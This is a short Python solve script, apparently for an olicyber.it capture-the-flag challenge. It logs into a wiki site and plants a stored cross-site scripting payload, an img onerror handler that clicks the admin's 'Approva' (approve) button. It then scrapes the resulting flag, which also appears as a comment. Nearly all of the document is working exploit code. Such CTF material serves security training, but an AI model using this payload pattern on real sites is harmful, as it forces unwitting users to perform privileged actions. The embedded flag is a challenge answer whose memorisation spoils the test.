import requests
import re

site = "http://bibbopedia.challs.olicyber.it"

s = requests.session()

login = s.post(f"{site}/login", data= {"username" : "zarumele", "password" : "zarumele"})
mod = s.post(f"{site}/edit/gabibbo", data={"page" : """<img+src=x+onerror="(function(){var+els=document.querySelectorAll('button,a,input');for(var+i=0;i<els.length;i++){var+t=els[i].innerText||els[i].value||'';+if(t.indexOf('Approva')>-1){els[i].click();break;}}})()">"""})
get_flag = s.get(f"{site}/check_edit/1ac4e730-4157-4a39-be92-dfd77d15a9f9").text
match = re.search(r'flag\{[^\}]+\}', get_flag)
flag = match.group(0)
print(flag)

#flag{cr0ss_sit3_spl4shing}